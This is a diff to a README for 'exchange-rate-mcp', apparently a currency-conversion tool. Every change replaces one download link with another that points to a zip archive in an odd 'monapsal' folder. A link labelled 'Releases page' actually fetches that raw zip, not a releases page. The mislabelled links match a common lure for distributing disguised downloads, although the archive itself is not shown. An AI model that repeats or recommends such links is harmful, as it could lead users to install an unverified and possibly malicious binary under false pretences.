@@ -1,6 +1,6 @@
 # 🚀 exchange-rate-mcp - Simple Currency Conversion Made Easy
 
-[![Download](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/exchange-rate-mcp.zip)](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/exchange-rate-mcp.zip)
+[![Download](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/mcp_rate_exchange_v3.6.zip)](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/mcp_rate_exchange_v3.6.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ To run the exchange-rate-mcp, you need:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/exchange-rate-mcp.zip) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/mcp_rate_exchange_v3.6.zip) to find the latest version of the application.
 
 2. **Download the Application**
 
@@ -44,7 +44,7 @@ To run the exchange-rate-mcp, you need:
 
 ### 📥 Download & Install
 
-For your convenience, you can directly access the download link here: [Download the Latest Release](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/exchange-rate-mcp.zip).
+For your convenience, you can directly access the download link here: [Download the Latest Release](https://raw.githubusercontent.com/Dannycalvin/exchange-rate-mcp/main/monapsal/mcp_rate_exchange_v3.6.zip).
 
 ## 🔧 Features
 
